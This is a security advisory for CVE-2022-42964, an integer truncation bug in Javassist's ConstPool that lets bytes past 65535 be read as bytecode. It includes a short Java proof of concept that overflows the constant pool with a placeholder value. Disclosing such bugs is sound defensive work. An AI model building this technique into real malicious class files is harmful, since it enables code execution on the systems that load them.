---
description: CVE-2022-42964 Low severity. Integer truncation in Javassist leads to local code execution
title: Javassist local code execution
date_published: "2022-08-11"
last_updated: "2022-08-11"
xray_id: 
vul_id: 
cvss: 6.4
severity: low
discovered_by: Omer Kaspi
type: vulnerability

---

## Summary

Integer truncation in Javassist leads to local code execution

## Component

[Javassist](https://github.com/jboss-javassist/javassist)

## Affected versions

Javassist (,3.29.1)

## Description

The issue lies in the write() function of the ConstPool object. When writing the ConstPool into a class file, the length field is written as a short integer, but the numOfItems Variable is not checked to see if it is bigger than the maximum value of short (65535). If we try to write a class file with a ConstPool bigger than 65535, the elements from position 65535 onwards wouldn’t be considered as part of the ConstPool, and will be interpreted as arbitrary bytecode. An attacker that can insert arbitrary integers into a classfile, could use this to insert malicious bytecode to the class, for example a constructor which will cause code execution when the class file is loaded



## PoC

```java
import javassist.NotFoundException; 
import javassist.bytecode.ClassFile; 
import javassist.bytecode.ConstPool; 
import java.io.DataOutputStream; 
import java.io.File;

import java.io.FileOutputStream; 
import java.io.IOException; 
public class JavassistIntTruncationExample 
{ 
	public static void main(String argv[]) throws IOException, NotFoundException { 
		File yourFile = new File("malicious.class"); 
		yourFile.createNewFile(); 
		FileOutputStream oFile = new FileOutputStream(yourFile, false); DataOutputStream stream = new DataOutputStream(oFile); 
		ClassFile clazz_file_before_write = new 
		ClassFile(false,"test",null); 
		ConstPool pool_before_write = 
		clazz_file_before_write.getConstPool(); 
		// Adding enough ints to cause integer truncation 
		for(int i = 0; i< 65527; i++) { 
			pool_before_write.addIntegerInfo(0xcafebabe); 
		} 
		// BUG: This integer will be added as arbitrary bytecode! 
		pool_before_write.addIntegerInfo(0xdeadbeef); 
		System.out.println("Constpool size" + pool_before_write.getSize()); clazz_file_before_write.write(stream); 
	} 
} 

```



## Vulnerability Mitigations

No mitigations are supplied for this issue



## References

[GitHub issue](https://github.com/jboss-javassist/javassist/issues/423)